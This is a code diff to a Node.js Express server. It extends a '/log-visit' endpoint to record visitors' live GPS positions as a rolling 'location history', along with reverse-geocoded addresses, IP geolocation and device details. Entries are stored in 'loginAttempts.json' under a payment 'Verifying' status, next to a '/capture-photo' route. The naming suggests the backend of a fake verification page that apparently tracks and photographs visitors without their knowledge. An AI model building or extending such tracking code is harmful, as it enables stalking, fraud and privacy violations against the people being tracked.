@@ -834,85 +834,109 @@ app.post("/capture-photo", async (req, res) => {
   }
 });
 
-// Log visit/verification attempt with location
+// Log visit/verification attempt with location (Supports Real-time Updates)
 app.post("/log-visit", async (req, res) => {
   try {
     const {
       paymentId,
       location,
       deviceDetails,
-      userAgent
+      userAgent,
+      isUpdate
     } = req.body;
 
     const ip = getClientIP(req);
     const timestamp = new Date().toISOString();
     const geo = await getGeoWithFallback(ip);
 
-    // Parse location if string
+    // Parse location
     let parsedLocation = location;
     if (typeof location === 'string') {
-      try {
-        parsedLocation = JSON.parse(location);
-      } catch (e) { }
+      try { parsedLocation = JSON.parse(location); } catch (e) { }
     }
 
-    // Parse device details if string
+    // Parse device details
     let parsedDeviceDetails = deviceDetails;
     if (typeof deviceDetails === 'string') {
-      try {
-        parsedDeviceDetails = JSON.parse(deviceDetails);
-      } catch (e) { }
+      try { parsedDeviceDetails = JSON.parse(deviceDetails); } catch (e) { }
     }
 
-    // Enhanced location processing (Handles both flat and nested structures)
-    let enhancedLocation = parsedLocation;
+    // Extract coords for reverse geocoding
     let coords = null;
-
     if (parsedLocation) {
-      if (parsedLocation.latitude && parsedLocation.longitude) {
-        coords = parsedLocation;
-      } else if (parsedLocation.finalLocation && parsedLocation.finalLocation.coords) {
-        coords = parsedLocation.finalLocation.coords;
-      }
+      if (parsedLocation.latitude && parsedLocation.longitude) coords = parsedLocation;
+      else if (parsedLocation.coords && parsedLocation.coords.latitude) coords = parsedLocation.coords;
+      else if (parsedLocation.finalLocation && parsedLocation.finalLocation.coords) coords = parsedLocation.finalLocation.coords;
+      else if (parsedLocation.finalLocation && parsedLocation.finalLocation.latitude) coords = parsedLocation.finalLocation;
     }
 
+    // Add address if coords present
     if (coords && coords.latitude && coords.longitude) {
       const address = await reverseGeocode(coords.latitude, coords.longitude);
       if (address) {
-        if (parsedLocation.latitude) {
-          enhancedLocation = { ...parsedLocation, address };
+        if (parsedLocation.finalLocation) {
+          parsedLocation.finalLocation.address = address;
         } else {
-          enhancedLocation = {
-            ...parsedLocation,
-            finalLocation: {
-              ...parsedLocation.finalLocation,
-              address: address
-            }
-          };
+          parsedLocation.address = address;
         }
       }
     }
 
-    const logData = {
-      verificationId: paymentId || "VISIT-" + crypto.randomBytes(4).toString("hex").toUpperCase(),
-      timestamp,
-      ip,
-      geo, // IP-based location (now always present)
-      location: enhancedLocation, // GPS-based location with address
-      deviceDetails: parsedDeviceDetails,
-      userAgent: userAgent || req.headers["user-agent"],
-      status: "Verifying",
-      type: "Visit"
-    };
+    const verificationId = paymentId || "VISIT-" + ip.replace(/[.:]/g, "").slice(-4) + "-" + timestamp.slice(14, 19).replace(":", "");
 
-    // Append to loginAttempts.json
     const logFile = path.join(__dirname, "loginAttempts.json");
     await safeUpdateJSON(logFile, (attempts) => {
-      attempts.push(logData);
+      // Find existing attempt by ID
+      const existingIndex = attempts.findIndex(a => a.verificationId === verificationId);
+
+      if (existingIndex !== -1) {
+        // UPDATE EXISTING: Merge new data
+        const existing = attempts[existingIndex];
+
+        // Update basic info
+        existing.timestamp = timestamp;
+        existing.ip = ip;
+        if (geo) existing.geo = geo;
+        if (parsedLocation) existing.location = parsedLocation;
+        if (parsedDeviceDetails) existing.deviceDetails = parsedDeviceDetails;
+
+        // Maintain Location History (The "Time Path")
+        if (!existing.locationHistory) existing.locationHistory = [];
+        if (coords) {
+          existing.locationHistory.push({
+            coords,
+            timestamp,
+            source: (parsedLocation.finalLocation ? parsedLocation.finalLocation.source : (parsedLocation.source || 'Update'))
+          });
+          // Keep last 50 points to prevent bloat
+          if (existing.locationHistory.length > 50) existing.locationHistory.shift();
+        }
+
+        existing.status = existing.status || "Verifying";
+        existing.lastUpdate = timestamp;
+        existing.isLive = true;
+      } else {
+        // NEW ENTRY
+        const logData = {
+          verificationId,
+          timestamp,
+          ip,
+          geo,
+          location: parsedLocation,
+          deviceDetails: parsedDeviceDetails,
+          userAgent: userAgent || req.headers["user-agent"],
+          status: "Verifying",
+          type: "Visit",
+          locationHistory: coords ? [{ coords, timestamp, source: 'Initial' }] : [],
+          isLive: true,
+          lastUpdate: timestamp
+        };
+        attempts.push(logData);
+      }
       return attempts;
     });
 
-    res.json({ success: true });
+    res.json({ success: true, verificationId });
   } catch (error) {
     console.error("Log visit error:", error);
     res.status(500).json({ success: false });
